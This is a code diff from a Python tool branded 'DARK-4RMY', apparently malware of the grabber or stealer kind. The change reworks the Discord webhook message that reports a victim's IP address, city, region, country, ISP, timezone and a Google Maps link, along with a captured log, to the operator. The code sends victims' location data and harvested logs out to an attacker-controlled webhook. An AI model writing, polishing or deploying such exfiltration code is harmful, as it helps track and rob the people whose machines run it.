@@ -28,13 +28,19 @@ class DARK4RMY:
         webhook = DiscordWebhook(url=WEBHOOK, username="DARK-4RMY", avatar_url="https://abagond.wordpress.com/wp-content/uploads/2020/07/dark-army.png")
         embed = DiscordEmbed(title="", description="[DARK-4RMY](https://rvlt.gg/8ez9akZK)", color="000000")
         embed.set_image(url="https://mir-s3-cdn-cf.behance.net/project_modules/disp/33779762328391.5a8cb66e6f1c5.png")
-        embed.add_embed_field(name="👹 IP", value=f"||{ip}||", inline=False)
-        embed.add_embed_field(name="👹 City", value=f"{city}", inline=False)
-        embed.add_embed_field(name="👹 Region", value=f"{region}", inline=False)
-        embed.add_embed_field(name="👹 Country", value=f"{country}", inline=False)
-        embed.add_embed_field(name="👹 Location", value=f"[G Maps](<{googlemaps}>)", inline=False)
-        embed.add_embed_field(name="👹 ISP", value=f"{org}", inline=False)
-        embed.add_embed_field(name="👹 Timezone", value=f"{timezone}", inline=False)
+        embed.add_embed_field(
+        name="",
+        value=(
+            f"```IP       : {ip}\n"
+            f"City     : {city}\n"
+            f"Region   : {region}\n"
+            f"Country  : {country}\n"
+            f"ISP      : {org}\n"
+            f"Timezone : {timezone}```\n"
+            f"[G Maps](<{googlemaps}>)"
+        ),
+        inline=False
+    )
 
         embed.add_embed_field(name="", value=f"```{self.log}```", inline=False)
         webhook.add_embed(embed)
